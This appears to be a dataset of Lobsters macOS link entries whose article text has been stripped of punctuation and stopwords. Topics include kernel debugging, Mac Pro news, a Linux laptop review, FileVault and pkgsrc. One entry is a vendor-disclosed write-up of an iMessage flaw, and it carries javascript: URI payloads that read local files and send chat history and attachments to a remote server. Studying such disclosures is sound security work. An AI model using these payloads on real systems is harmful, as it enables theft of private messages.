440,Lobsters,mac,Apple macOS,Debugging macOS Kernel using VirtualBox,https://klue.github.io/blog/2017/04/macos_kernel_debugging_vbox/,debugging macos kernel using virtualbox,hn discussion smap installing virtualbox sierra mac app store networking installing xcode mac app store install kernel debug kit kdk kdk apple developer site update nvram bootargs apple kernel programming guide apple doc modifying nvram virtualbox user manual swapping kernel protected system integrity protection sip selfcompiled kernel reliably booting recovery step sourcelevel debugging xnu source code setting lldb,update hn discussion awalton mentioned set cpuid flag vmware simply adding vmx file disable smap late last year upgraded old mbp model skylake processor debugging kernel exploit turned smap enabled inside vmware fusion vm wanted avoid dealing smap could nt figure disable fusion luckily virtualbox vms support smap yet post stepbystep guide setup macos kernel sourcelevel debugging using virtualbox though step example geared toward virtualbox guide also used setup kernel debugging vmware fusion since even straightforward fusion installing virtualbox sierra nt already macos virtualbox vm must first install target macos vm either provide vmdk vmware fusion vm create fresh vm virtualbox requires iso image install o newly created vms command used create iso sierra install app obtained mac app store hdiutil attach applicationsinstall macos sierraappcontentssharedsupportinstallesddmg noverify nobrowse mountpoint volumesinstallesd hdiutil create tmpsierra size type sparse layout spud f hfsj hdiutil attach tmpsierrasparseimage noverify nobrowse mountpoint volumesinstall asr restore source volumesinstallesdbasesystemdmg target volumesinstall noprompt noverify erase rm volumesos x base systemsysteminstallationpackages cp rp volumesinstallesdpackages volumesos x base systemsysteminstallation cp rp volumesinstallesdbasesystemdmg volumesos x base systembasesystemdmg cp rp volumesinstallesdbasesystemchunklist volumesos x base systembasesystemchunklist hdiutil detach volumesinstallesd hdiutil detach volumesos x base system hdiutil resize sector min tmpsierrasparseimage hdiutil convert tmpsierrasparseimage format udto tmpsierra rm tmpsierrasparseimage mv tmpsierracdr tmpsierraiso networking using bridged adapter nt anything special need decide go nat need enable port forwarding kdp work vm adapter setting choose advanced rightarrow port forwarding need reach debugee vm forward localhost vm installing xcode install xcode host machine easiest way install mac app store installing accepting xcode license required either opening xcode accepting command line sudo xcodebuild license accept install kernel debug kit kdk host debugger machine need install kdk apple developer site corresponding debugee macos version build guide used build kdk installs librarydeveloperkdks provides release development debug kernel macos well symbol kernel various apple kexts difference different kernel development debug kernel additional assertion error checking compared release debug build even development note debugee system need kdk installed update nvram bootargs order debug vm must set debug option bootargs nvram debugee vm numerous option addition debug use could interest including debug v always boot system verbose mode kcsuffix specifies kernel boot using given suffix pmuflags many people still seem recommend setting option however apple kernel programming guide say power management watchdog timer present earlier desktop laptop early desktop primary watchdog timer normally enabled o x server thus option nt seem anything though setting nt hurt zc zonename zc conjunction zlog log allocation free specified zone debug option allows u perform remote kernel debugging available flag listed apple doc usually use dblogpiscrn dbarp dbnmi nonmaskable interrupt nmi triggered pressing control option command shift escape triggering nmi break debugger super convenient key combo play well virtualbox cover host key combo rebound host key right command right option modifying nvram vmware fusion modify nvram using nvram command like sudo nvram bootargs v virtualbox find easy reboot nvram modification disappeared virtualbox user manual shed light currently possible manipulate efi variable within running guest eg setting bootargs variable running nvram tool mac o x guest work alternative way extradata passed vm order set bootargs variable change bootargs efi variable thus need shutdown vm run command host vboxmanage list vms take uuid use next command macos vboxmanage setextradata v swapping kernel alluded debugging different build kernel previously mentioning kcsuffix option specifies kernel build use kernel file must systemlibrarykernels debugee vm surprise directory protected system integrity protection sip therefore want use kdk kernel selfcompiled kernel must first boot recovery copy target kernel directory invalidate kext cache reboot reliably booting recovery fusion booting recovery mode using cmdr easy physical machine virtualbox hand requires step booting vm hit select boot manager rightarrow efi internal shell greeted efi shell boot recovery type comapplerecoverybootbootefi recovery gui load launch terminal move target kernel invalidate kextcache mv pathtokernelskerneldevelopment systemlibrarykernels kextcache invalidate volumesmacintosh hd reboot reboot optionally disable sip desired csrutil disable successfully disabled system integrity protection please restart machine change take effect sourcelevel debugging download xnu source code corresponding debuggee xnu version gain sourcelevel debugging lldb look librarycachescomapplexbssourcesxnuxnu kernel source either place downloaded source create symlink point source alternatively also set targetsourcemap lldb lldb setting set targetsourcemap previous version macos like yosemite place source code sourcecachexnu setting lldb finally break debugger example set target file release kernel build use xnu lldb macro sierra kdk macholib python module required simple pip install macholib trick use nifty lldb macro copy paste kdk debug script command prompted first set target file kdk kernel triggering nmi waiting debugger halt boot process chose dbhalt flag connect debugee command kdpremote ip ip ip address localhost used nat port forwarding lldb lldb target create warning kernel contains debug script run script debug session command script import pythonkernelpy run discovered debug script session setting set targetloadscriptfromsymbolfile true current executable set lldb command script import pythonkernelpy loading kernel debugging pythonkernelpy lldb version setting set targetprocesspythonospluginpath pythonlldbmacroscoreoperatingsystempy setting set targettraphandlernames hndlallintrs hndlalltraps trapfromkernel hndldoublefault hndlmachinecheck flehprefabt exceptionvectorsbase exceptionvectorstable flehundef flehdataabt flehirq flehdecirq flehfiqgeneric flehdec command script import pythonlldbmacrosxnupy xnu debug macro loaded successfully run showlldbtypesummaries enable type summary lldb kdpremote version darwin kernel version fri nov pst root kernel uuid load address kernel slid memory loaded kernel file target arch instantiating thread completely saved state memory loading kext module warning ca nt find binarydsym comapplekeccorecrypto warning ca nt find binarydsym comapplekecpthread omitted done kernel compiled optimization stepping may behave oddly variable may available process stopped thread name queue stop reason signal sigstop frame kernel debugger message unavailable opt doprnthidepointers olddoprnthidepointers asm hwatomicsub debugmode char lldb voila sourcelevel debugging macos kernel
441,Lobsters,mac,Apple macOS,Daring Fireball: The Mac Pro Lives,http://daringfireball.net/2017/04/the_mac_pro_lives,daring fireball mac pro life,mac pro life matthew panzarino lance ulanoff ina fried john paczkowski,mac pro life tuesday april let beat around bush great news share apple currently hard work completely rethought mac pro modular design accommodate highend cpu big honking hotrunning gpus make easier apple update new component regular basis also working applebranded pro display go also notsogreat news nextgen mac pro pro display ship year hope mean next year apple said year meantime apple today releasing meager speedbump update existing mac pro model go xeon cpu core dual amd gpus dual gpus model go cpu core dual gpus dual gpus nothing else changing including port usbc thunderbolt support lg ultrafine display good news apple great new imacs pipeline slated release year including configuration specifically targeted large segment pro market let say apple faced following problem three year ago launched radical new lineup mac pro multiple reason shipped update machine since point came conclusion mac pro concept fundamentally flawed tightly integrated internally allowed nice feature small beautiful pro machine demanded placement desk desk could run whisper quietly tight integration made hard update regularly idea expansion could handled almost entirely external thunderbolt peripheral sounded good paper panned practice gpu design bad prediction apple bet dualgpu design multiple smaller gpus pro level performance coming parallel processing industry gone largely direction machine one big gpu decided completely redesign mac pro new design going ship year committed pro user sizable chunk growing ever restless suspect case strongly care anymore see stalled mac pro lineup sign apple longer care worry deeply mac pro merely waiting major update instead waiting decommissioned really two option point first would suck wait nextgeneration mac pro ready announced suffer silence people point current mac pro stagnation proof apple abandoning mac pro market second would bite bullet tell world plan even though decadeslong tradition fundamental part company culture let actual shipping product promise future product tell story apple chose latter inside nondescript singlestory office building apple extended old campus across de anza boulevard one infinite loop apple product realization lab mac hardware better known internally machine lab make refine prototype new mac hardware get see anything cool moment lift black cloth show u prototype future hardware setting feel chosen simply set tone innovative mac hardware design across entire mac lineup thing past nine people table phil schiller craig federighi john ternus vice president hardware engineering charge mac hardware speak apple bill evans apple pr set ground rule run clock minute five writer invited billed small roundtable discussion mac matthew panzarino lance ulanoff ina fried john paczkowski truly discussion record schiller broke news mac pro worth quoting length regard mac pro process call completely rethinking mac pro working team working hard right want architect keep fresh regular improvement committed making highestend highthroughput desktop system designed demanding pro customer part new mac pro definition modular system pro display well see product year process think really important create something great pro customer want mac pro modular system take longer year interim know number customer continue buy current mac pro clear current mac pro met need customer know clearly customer none black white wide variety customer kind system wanted others meantime going update configs make faster better dollar new model new design going update configs week give specific cpu moving line gpus line get performance per dollar customer need continue buy interim get newly architected system ideal world yes nextgen mac pro new display would shipping soon fact going say ideal already shipping make mistake good news anyone care mac pro u ear ground knew major change mac pro shipping soon meant one two thing nextgen mac pro way apple abandoning mac pro market given good news serious mac user even serious mac user buy mac pro hardware good news sign apple commitment pro mac software reason apple commit new modular mac pro unless also committed make mac mac software stats fact apple shared u discussion apple research show percent mac user use least one pro app frequently apps thing like music creation video editing graphic design software development basically apps performance intensive additional percent mac user use pro apps le frequently least time per month percent overall mac user base apple considers pro market overall split notebook desktop mac sale roughly personally little surprised desktop account even percent sale would guessed surprised hear even among pro user notebook far popular mac second place imacs mac pro third apple declined describe mac pro share mac sale specifically singledigit percent gut feeling single digit lot closer percent mac user apple considers pro market use macbook pro macbooks use desktop use imacs none surprise really exactly many user depend mac pro deeply concerned future apple care mac pro requires apple care small number user regarding imacs schiller also said new imacs work slated release time year specific year including configuration imac specifically pro customer mind acknowledging popular desktop pro imac craig federighi jumped said pretty incredible evolution seen last decade original imac never would thought remotely touching pro us look today imac top configs incredibly powerful huge fraction would traditionally whether audio editing video editing graphic art forth would previously absolutely required mac pro old welladdressed imac still even take imac high performance pro system think form factor address even pro market struck apple framing discussion big news whole point really preannouncing completely rethought nextgeneration mac pro emphasizing pro user use macbooks rest use imacs big plan store pro segment product line exactly would expected apple say breaking news mac pro going away dropping mac pro time come gone small percentage pro user need met macbook pro highend imacs might seem curious apple frame need allnew mac pro emphasizing many pro user need mac pro think context current mac pro make sense whose need met macbook pro imacs people need extreme performance current mac pro even putting aside age component met need user rest need fastest intel cpu market biggest powerful gpus etc current mac pro good fit several question u trying peg apple realized needed start design new mac pro apple unsurprisingly budge forthcoming fact current mac pro meeting need user need mac pro federighi think designed bit thermal corner designed system kind gpus time thought needed thought could well serve two gpu architecture thermal limit needed thermal capacity needed workload materialize fit broadly hoped able put larger single gpus required different system architecture thermal capacity system designed accommodate became fairly difficult adjust time many customer moving imac saw path address many many finding limited mac pro next generation imac really put lot energy behind schiller said made something bold thought would great majority mac pro user discovered great others enough need take another path one good thing hopefully apple year willingness say something quite wanted live expectation afraid admit look next answer word mistake uttered close going get apple admitting miscalculated current mac pro concept one word uttered however sorry schiller asked whether already external design mind nextgen mac pro going get exactly stage told team take time something really great something supported long time customer update upgrade throughout year take time take current mac pro said time constrained thermally restricted ability upgrade sorry disappoint customer wanted asked team go rearchitect design something great future mac pro customer want expandability upgradability future meet need takeaway mac future bright mac sale outpacing pc industry whole new macbook pro hit sale percent year year mac billion business apple annually according company million people active mac user base worldwide yes number peanut compared iphone everything peanut compared iphone ternus put plainly talented folk working mac mean quite frankly lot company company run mac company full pro mac user asked whether apple aware many serious mac user begun doubt company commitment mac general need pro mac user particular schiller said reasonable question today specifically address question else committed mac got great talent mac hardware software got great product planned future far horizon line see mac core component thing apple delivers including pro customer think simply untenable apple continue remain silent mac pro front matter disappointing consider today speed bump update lineup certainly better update way apple could release today speed bump without acknowledging update suggest apple committed mac pro fact released speed bump without comment future mac pro people would reasonably concluded apple lost goddamned mind ultimately action speak louder word much like word heard yesterday miscellaneous tidbit discussion near end john paczkowski presence mind ask mac mini mentioned point schiller say mac mini important product lineup bringing mix consumer pro use mac mini remains product lineup nothing say today schiller apple pro apps want reiterate strong commitment well final cut pro x logic pro x team software product completely dedicated delivering great pro software customer foot gas federighi think use xcode downloads metric possible software developer actually largest pro audience growing quickly fantastic asked whether cominginthefuture nextgen mac pro would assembled u current one schiller said ready talk yet line happy example type software current mac pro wellsuited federighi mentioned vr vr certain kind high end cinema production task software written target know balance well across multiple gpus scale across single large gpu asked scripting automation whether apple still see scripting automation important part pro market federighi think scriptability automation system remain super important
442,Lobsters,mac,Apple macOS,Discovering my inner curmudgeon: A Linux laptop review,http://www.onebigfluke.com/2017/04/discovering-my-inner-curmudgeon-linux.html,discovering inner curmudgeon linux laptop review,disappointed apple latest macbook pro release set alternative computer bestbuy shrink main partition loaded ubuntu image usb drive ubuntu simple install instruction enable booting usb gnometweaktool new libinput system xinput setting libinputgestures dvorak kernel bug open version powertop pmpowersave linux firmware support onboard iiosensorproxy oneoff script kubuntu variant new functional language homomorphic encryption teletypes,quick refresher lifelong mac user disappointed apple latest macbook pro release researched set alternative computer consider surprise even decided leave mac platform chose hp spectre laptop released ce new version display bought machine bestbuy affiliate link retailer selling configuration goal run ubuntu linux instead window impression using computer past month followed realization ubuntu installing ubuntu easy machine came window preinstalled used window builtin disk management app shrink main partition free space linux loaded ubuntu image usb drive conveniently fit machine usba port missing new mac followed ubuntu simple install instruction required bios change enable booting usb screen screen spectre gorgeous latest ubuntu handle high dpi screen well surprised combination builtin setting app additional package like gnometweaktool get ui control rendering display native size look right also boost default font size make proportional even setting adjust icon size window titlebar task manager fiddly got everything set relatively quickly trackpad trackpad hardware rattle little follows finger well support multitouch input ubuntu default however immediately realize something wrong try type mouse start jumping around default synaptics driver linux nt properly ignore palm press machine solution switch new libinput system adjusting xinput setting get work decently well gesture used like two finger swipe go back chrome fourfinger swipe switch workspace nt work default ubuntu use tool like libinputgestures enable even gesture recognized time frustrating clickpad functionality also problematic press thumb dualpurpose trackpadbutton surface order click system often think meant move mouse trying multitouch resize frustrating keyboard physically keyboard good key lot travel type fast left control key far bottom left usable unlike mac put function key arrow key work well one peculiarity keyboard extra column key right side includes delete home page page end caused muscle memory switching arrow key home row key one column also put hand center typing make feel like slightly reaching right side first thought extra column key home page etc superfluous struggling use sublime text writing code realized text input control linux window rely key make sense hp decided include mac user used commandright going end line window linux user would reach end key remapping every key match mac setup possible hard make consistent across program right thing relearn text input new key spent time trying retrain muscle memory frustrating like summer tried dvorak sound machine come four speaker two fancy bang olufsen speaker top two normal one bottom top speaker nt work linux kernel bug open figure bottom speaker work quiet headphone jack worked correctly would even mute speaker automatically plugged headphone believe happened upgraded kernel bleeding edge version attempt make hardware functional figure community eventually resolve kernel bug top speaker issue likely temporary situation emphasizes hp need ship custom distribution window bunch extra magical driver battery power initially battery life terrible screen burn lot power also noticed cpu fan would turn frequently blow warm air left side machine hot enough uncomfortable lap figured mostly result lack power management ubuntu default configuration enable variety powersaving tool including powertop pmpowersave intel also provides linux firmware support make gpu idle properly change applied battery life got nearly hour disappointment compared hour advertised positive note usbc charger work great fill battery quickly also nice able charge nexus x phone plug twoinone spectre get name fact special hinge let laptop screen rotate completely around turning tablet without special configuration touching screen ubuntu work properly clicking scrolling zooming touch even work forwardback gesture nt work trackpad keyboard trackpad also automatically disable rotate tablet mode set onboard gnome onscreen keyboard decent screen autorotation nt work able cobble something together using iiosensorproxy oneoff script though realized aspect ratio screen much hurt eyeball scan far vertically tablet mode window manager program nt used linux regularly desktop machine since redhat come long way ubuntu boot quickly default ui us unity window manager gnome variant decent tried plain gnome felt clunky comparison ended liking kde would choose kde kubuntu variant start overall kde window manager felt nice everything needed journey back linux realized time use eight program web browser chrome terminal preference text editor sublime text setting configurator gui file manager automatic backup process arq fluxlike screen dimmer image editor gimp requirement beyond also simple rely four widget clock wifi status battery level volume level need task manager like dock virtual work space like mission control expose nt use desktop icon notification recent apps search application menu able accommodate preference linux conclusion market new laptop mean check one however selling spectre going back macbook air hp fault linux desktop problem value time accustomed ux mac extremely difficult use anything else efficiently brain tuned mac trackpad keyboard layout behavior text editing etc using hp machine linux slows much feel like starting using computer want spend time improving programming writing etc skill want invest retraining energy understanding unfamiliar topic like new functional language homomorphic encryption nt want waste time relearning fundamental contrast spent past two year learning play piano required rote memorization repeated physical exercise spending time practicing piano opened idea could nt appreciate learned thing music could nt comprehend past retraining effort expanded horizon skeptical adopting hp hardware linux desktop could similar effect stubborn come time need master new way working stay relevant much like telegraph operator switch morse code teletypes hope patience foresight make transition smoothly future choosing retrain would create new possibility seems like good litmus test achieving goal meantime keep using mac
443,Lobsters,mac,Apple macOS,Setting a custom FileVault (macOS FDE) passphrase,https://blog.filippo.io/filevault-2-custom-passphrase/,setting custom filevault macos fde passphrase,filevault work boot setting custom passphrase fresh install existing unencrypted macos existing encrypted macos follow twitter,filevault fulldisk encryption system macos normally turned system preference lock disk password user allowed unlock machine overloading loginunlocksudo password understandable ux simplicity choice make hard manage security tradeoff want easy type password login ca nt bruteforced offline want complex long passphrase fde documented way setting different password disk encryption o user however support present firmware filevault work boot macos lot thing booting main system boot pressing example boot recovery mode capable reinstalling system efi firmware support couple hidden partition one called recovery hd system decrypts main partition boot fde enabled default filevault fde setup involves unencrypted hidden recovery hd encrypted container partition actual partition inside filevault encryption controlled resident o unlockable set usernamepassword account filevault also used encrypt external drive case recovery hd single encrypted partition unlocked usernamepassword pair plain disk password setting custom passphrase want mix external drive encryption custom passphrase recovery hd boot process getting easy firmware happily asks disk password unlocks disk continues booting two easiest way found fresh install installing new machine nt care wiping entire thing fairly easy first boot recovery mode pressing starting machine select disk utility select macintosh hd partition whole drive nt want kill recovery hd make installer shrink partition make new one click erase choose mac o extended journaled encrypted select fde passphrase exit disk utility connect wifi install macos macintosh hd partition existing unencrypted macos little trickier would nt without backup first need boot external drive easiest way using carbon copy cloner make bootable drive ccc also excellent manage recovery hd partition end nuking boot pressing option select boot disk booted external drive open finder right click macintosh hd disk sidebar select encrypt nt forget securely wipe external drive existing encrypted macos hardest really make backup two option either unencrypt follow instruction wipe drive use carbon copy cloner choose latter use ccc make bootable copy system external drive boot external drive use disk utility erase target drive making single mac o extended journaled partition use ccc create recovery hd target drive sidebar volume recovery hd use finder encrypt target drive use ccc restore system external drive target drive nt forget securely wipe external drive note carbon copy cloner opinion enable filevault ignore want get nicely integrated userpassword experience trying avoid finally might want follow twitter
444,Lobsters,mac,Apple macOS,Night Shift Mode In macOS Does Not Have A Significant Impact On Reducing Blue Light Levels,http://wccftech.com/night-shift-mode-in-macos-does-not-have-a-significant-impact-on-reducing-blue-light-levels/,night shift mode macos significant impact reducing blue light level,macos flux filter blue light level far greater apple night shift mode security researcher demonstrates taking control new mac first wifi connection new apple patent envisions macbook virtual keyboard invisible trackpad source via,yesterday apple seen fit release macos update brings change firmware one notable feature part update night shift mode shift display hue much warmer end spectrum however feature may kind impact display developed let see detail matter flux filter blue light level far greater apple night shift mode member flux team suggested post flux might better option user compared apple night shift mode night shift mode flux serf purpose reducing emission blue light display improve sleeping cycle latter might right option according apple security researcher demonstrates taking control new mac first wifi connectionstudies shown exposure bright blue light evening affect circadian rhythm make harder fall asleep night shift us computer clock geolocation determine sunset location automatically shift color display warmer end spectrum morning return display regular setting basically night shift mode flux alters color temperature display specifically lower blue light output potentially disturbs sleeping cycle team member shared data depicts flux better option user blue light level night shift mode begin flux concludes night shift greatly reduce blue light level prove notion color intensity chart show level blue light user typical bedtime seen blue light filtered much flux hence making flux better option case flux blue light filtered dramatically overall chart prof flux color adjustment far significant impact user compared apple night shift offer blue light level flux flux forum note circadian system actually reacting small change color instead mostly reacting amount light eye extremely good distinguishing little shade color different system one drive circadian rhythm check entire flux post indepth insight whole scenario taking account light intensity chart flux delivers better performance reducing amount blue light emitting display nonetheless probably story sure stay tuned new apple patent envisions macbook virtual keyboard invisible trackpadas thought new night shift mode macos enjoying rest feature part update share thought u comment source via
445,Lobsters,mac,Apple macOS,"AudioKit: Swift audio synthesis, processing, & analysis platform for iOS, macOS and tvOS",https://github.com/audiokit/AudioKit,audiokit swift audio synthesis processing analysis platform io macos tvos,audiokit sponsor audiokit sponsoring aure github sponsor key concept installation framework readme file cocoapods carthage example code build playground release page audiokit playground video ray wenderlich audiokit tutorial audiokit tutorial ray wenderlich site getting help stackoverflow audiokit hashtag google group github issue contributing code rough outline working currently develop pull request u aurelius prochazka matthew fecher stephane peter core team slack contributor google group contributor contribute,audiokit audiokit audio synthesis processing analysis platform io macos tvos document serf onepage introduction audiokit much information available audiokit website sponsor audiokit team company using audiokit please consider sponsoring aure github sponsor key concept node operation tap node interconnectable signal processing component node output usually parameter node process another signal node also input operation similar node except signal processing component exist inside single node operation used parameter operation create complex result tap use node data source redirect audio signal away source node output node allows tap moved node node freely added audio signal path started installation installation detail found framework readme file audiokit also available via cocoapods place following podfile pod audiokit need ui component select core pod like pod audiokitcore also use carthage higher install precompiled static framework project example code three hello world project one apple platform io macos tvos play oscillator display waveform example rely audiokit framework either download precompiled framework build hello world need understand line code code description var oscillator akoscillator create sound generator audiokitoutput oscillator tell audiokit output audiokitstart start audiokit oscillatorstart start oscillator oscillatorfrequency random set oscillator parameter oscillatorstop stop oscillator playground playground contain bitesize example audiokit serve tutorial many audiokit core concept capability playground cover basic tutorial synthesis physical modeling file playback midi effect filter analysis provide playground macos project ready run xcode download audiokitplaygroundszip file release page open build project go playground page learn audiokit api fun way video playground action nt need run xcode check go audiokit playground video ray wenderlich audiokit tutorial check audiokit tutorial ray wenderlich site taken fun gentle journey framework via history sound synthesis computer audio getting help three method getting support roughly listed order try first post problem stackoverflow audiokit hashtag nt problem post stackoverflow may post google group moderated list prepare rejected moderator belief question better suited stackoverflow pretty sure problem implementation audiokit open github issue contributing code audiokit always improved core team user rough outline working currently want modify audiokit check develop branch opposed master make change send u pull request u audiokit created aurelius prochazka life line need help matthew fecher manages audiokit web site stephane peter aure coadmin manages audiokit release many important people family group description core team biggest contributor audiokit slack prolevel developer chat group contact core team member invitation contributor list people submitted code audiokit google group app announcement mailing list user contributor project exists thanks people contribute
447,Lobsters,mac,Apple macOS,"If You Can't Break Crypto, Break the Client: Recovery of Plaintext iMessage Data",https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/,ca nt break crypto break client recovery plaintext imessage data,fixed apple march technical tl dr technical detail message o x reading file taking message database attachment exploit overview github takeaway developer javascript everywhere webkit,fixed apple march applicationlayer bug lead remote disclosure message content attachment plaintext exploiting o x message client contrast attacking imessage protocol relatively simple bug need graduate degree mathematics exploit require advanced knowledge memory management shellcode rop chain attacker requires basic understanding javascript video demonstrates attack action technical tl dr message imessage o x apple implement user interface via embedded version webkit additionally message o x render uri clickable html href uri link attacker create simple javascript uri eg javascript clicked allows attacker code gain initial execution crosssite scripting context application dom though embedded webkit library used message o x executes applewebdata origin attacker still read arbitrary file using xmlhttprequest xhr get request file uri due lack sameorigin policy sop abusing xhr read file attacker upload victim chat history attachment remote server fast victim internet connection allow user interaction required successful attack single click url furthermore victim ability forward text message computer sm forwarding enabled attacker also recover message sent victim iphone want know gritty detail keep reading technical detail message o x message o x depends upon embedded version html rendering engine webkit much user interface message sent received html inserted dom render ui accompanying attachmentsmedia content message sent application rendered dom hence common clientside web vulnerability affect message o x application testing message o x client arbitrary protocol scheme found automatically converted link inserted dom example uris inserted link webview messaged test test smb test testcom file etc anyurihandler anycontentafter message o x implement accepted protocol whitelist attacker send message victim containing javascript namespace javascript converted link victim machine link clicked embedded webkit execute attackercontrolled javascript current origin example note ie n used escape javascript comment required match parser linking pattern code interpreted look like following bishopfoxcomresearch prompt upon clicking link javascript prompt triggered message o x however message o x desktop application website thus javascript executed context applewebdata origin since attacker code executing full webkit implementation xmlhttprequest available runtime one notable difference embedded version webkit web browser like chrome safari webkit implement sameorigin policy sop desktop application attacker take advantage read file local filesystem without violating sameorigin policy sending xmlhttprequest get request file uris requirement attacker must know full file path relative file system path eg sshidrsa used reading file message o x application dom execute following read etcpasswd file function reqlistener prompt thisresponsetext send back attacker server var oreq new xmlhttprequest oreqaddeventlistener load reqlistener oreqopen get file etcpasswd oreqsend converted uri payload code resembles javascript bishopfoxcomresearch thisresponsetext clicked message application following prompt appears vector seems long suspicious shortening uri possible dynamically loading javascript another domain including dom example injects javascript http application dom javascript bishopfoxcomresearch javascript file referenced example contain arbitrary javascript instruction arbitrary length due o x application sandbox file accessible located librarymessages nonuser system directory etc taking message database attachment message attachment received message o x saved directory user lt username gt librarymessages message textual content metadata stored sqlite database located user lt username gt librarymessageschatdb database also contains location attachment located user machine steal database subsequently attachment ever received sent victim advanced attack payload becomes necessary exploit overview following step need carried data successfully removed attacker determine currently loggedin user requesting parsinglibrarypreferencescomappleloginwindowplist file readable o x application sandbox make trivial construct full path user chatdb database file exfiltrated passed custom serverside script extract full path attachment sent received victim found database attachment table full path retrieved malicious javascript payload used extract attachment file victim machine via xmlhttprequest attacker next performs little obfuscation make url appearance realistic javascript wwwfacebookcomphotophp amp amp amp theater victim click uri message o x application victim entire chat history associated attachment transferred attacker exploit code available github takeaway developer javascript everywhere clientside content injection flaw longer limited browser time certainly helpful developer use web technology webkit dangerous kin nwjs build desktop application library adverse effect application security used naively clear embedded web framework allow common vulnerability crosssite scripting x leveraged devastating way previously possible vulnerability also demonstrates power uri machine novice user uri simply link website one variant much complicated ecosystem much like email attachment user never click uri unless trust source came even exercise prudence like thank apple communicating u throughout process cooperation quickly remediating vulnerability
448,Lobsters,mac,Apple macOS,Easy pkgsrc on macOS with pkg_comp 2.0,http://julio.meroh.net/2017/02/pkg_comp-2.0-tutorial-macos.html,easy pkgsrc macos pkgcomp,shiny new pkgcomp using macosspecific selfinstaller goal keeping netbsd uptodate pkgcomp getting started release page github adjusting configuration cron job sample configuration building package hand installing resulting package keeping system uptodate,tutorial guide shiny new pkgcomp macos using macosspecific selfinstaller goal use pkgcomp build binary repository package interested keep repository fresh daily basis use repository pkgin maintain macos system uptodate secure tutorial specifically targeted macos relies macosspecific selfinstaller package generic tutorial us pkgcompcron package pkgsrc see keeping netbsd uptodate pkgcomp getting started first download install standalone macos installer package find right file navigate release page github pick recent release download file name form pkgcomp version macospkg doubleclick file downloaded follow installation instruction asked administrator password installer place file usrlocal note pkgcomp requires root privilege anyway run us chroot internally grant permission point another installer modifies default path creating etcpathsdpkgcomp include pkgcomp installation directory pkgsrc installation prefix restart shell session make change effective update shell startup script accordingly use standard one lastly make sure xcode installed standard applicationsxcodeapp location component required build commandline apps available tip try running cc command line seeing print usage message adjusting configuration macos flavor pkgcomp configured installation prefix usrlocal mean executable located usrlocalsbinpkgcomp configuration file usrlocaletcpkgcomp intentional keep pkgcomp installation separate pkgsrc installation run matter state pkgsrc installation configuration file follows usrlocaletcpkgcompdefaultconf pkgcomp configuration file default configured installer good go macos particular package configured go optpkg instead traditional usrpkg necessity latter writable starting o x el capitan thanks system integrity protection sip usrlocaletcpkgcompsandboxconf configuration file sandboxctl support tool pkgcomp us manage compilation sandbox default setting configured installer good usrlocaletcpkgcompextramkconf pkgsrc configuration file configure thing like license acceptable packagespecific option like set configure layout installed file eg localbase handled internally pkgcomp specified defaultconf usrlocaletcpkgcomplisttxt determines set package want build automatically either via auto command periodic cron job automated build fail unless list least one package make sure list pkgin install better binary package management tool find handy keep installation uptodate note configuration file use varpkgcomp directory dumping ground pkgsrc tree downloaded distribution file built binary package see reference location later cron job installer configures cron job run root invoke pkgcomp daily goal cron job keep local package repository uptodate binary upgrade time edit cron job configuration interactively running sudo crontab e cron job effect populated listtxt file described safe let enabled configured pkgcomp want disable periodic build remove pkgcomp entry crontab slow machine building lot package may want consider decreasing build frequency daily weekly sample configuration configuration look like mac mini dumped config subcommand use output get idea expect using value shown rest tutorial pkgcomp config autopackages autoconf automake bash colordiff dash fusebindfs fusesshfs fuseunionfs gdb gitbase gitdocs gmake gnuls libtoolbase mercurial mozillarootcerts pdksh pkgdeveloper pkgconf pkgin rubyjekyll rubyjekyllarchives rubyjekyllpaginate scmcvs smartmontools tmux vim cvsroot ext anoncvs anoncvsnetbsdorg cvsroot cvstag undefined distdir varpkgcompdistfiles extramkconf usrlocaletcpkgcompextramkconf fetchvcs git gitbranch trunk giturl http githubcomjsonnpkgsrcgit localbase optpkg njobs package varpkgcomppackages pbulkpackages varpkgcomppbulkpackages pkgdbdir optpkglibdatapkgdb pkgsrcdir varpkgcomppkgsrc sandboxconffile usrlocaletcpkgcompsandboxconf sysconfdir optpkgetc updatesources true varbase optpkgvar darwinnativewithxcode true sandboxroot varpkgcompsandbox sandboxtype darwinnative building package hand fully installed configured build stuff hand ensure setup work cron job come simplest usage form involves full automation assumes listed least one package listtxt something like sudo pkgcomp auto triviallylooking command clone update copy pkgsrc create sandbox bootstrap pkgsrc pbulk use pbulk build given package destroy sandbox successful invocation left collection package varpkgcomppackages directory like restrict set package build manuallytriggered build provide argument auto override content autopackages derived listtxt file wanted invoke stage separately bypassing auto command would equivalent sudo pkgcomp fetch sudo pkgcomp sandboxcreate sudo pkgcomp bootstrap sudo pkgcomp build package name sudo pkgcomp sandboxdestroy go ahead play also use sandboxshell command interactively enter sandbox see pkgcomp detail lastly note root user receive email message periodic pkgcomp cron job fails fails said find full log build successful varpkgcomplog installing resulting package built first set package want install easy macos use pkgsrc install pkgcomp first unpack pkgsrc installation cd sudo tar xzvpf varpkgcomppackagesbootstraptgz install package like pkgpathfile varpkgcomppackagesall sudo pkgadd pkgin package name command assume restarted shell pick correct path pkgsrc installation call pkgadd fails missing binary try restarting shell explicitly running binary optpkgsbinpkgadd keeping system uptodate thanks cron job build package local repository varpkgcomppackages always uptodate use quickly upgrade system minimal downtime assuming going use pkgtoolspkgin recommended configure local repository sudo binsh c echo file varpkgcomppackagesall optpkgetcpkginrepositoriesconf take upgrade system sudo pkgin update sudo pkgin upgrade enjoy
450,Lobsters,mac,Apple macOS,Awesome OSX Command Line,https://github.com/herrbischoff/awesome-osx-command-line,awesome osx command line,contribution guideline awesome command line apps caffeinating http githubcomsponsorsherrbischoff foreword man page man page man page content appearance subpixel antialiasing font smoothing transparency transparency menu window wallpaper set wallpaper application app store list apps downloaded app store show debug menu apple remote desktop kickstart manual page activate deactivate ard agent helper remote desktop sharing remove apple remote desktop setting contact debug mode google uninstall google update itunes keyboard medium key mail show attachment icon vacuum mail index safari change default font develop menu web inspector get current page data use backspacedelete go back page sketch export compact svgs skim turn auto reload dialog terminal focus follows mouse textedit use plain text mode default visual studio code vscodevim key repeat subpixel antialiasing subpixel antialiasing backup time machine change backup interval local backup prevent time machine prompting use new hard drive backup volume show time machine log toggle backup battery verify backup developer vim compile sane vim neovim xcode install command line tool without xcode remove unavailable simulator dock add stack recent application show recent apps add nameless stack folder small spacer add space add small space auto rearrange space based recent use automatically hide icon bounce lock dock size reset dock resize scroll gesture set auto showhide delay show hidden app icon show active application show recent apps single app mode document convert file html file disk volume create empty file disable sudden motion sensor eject mountable 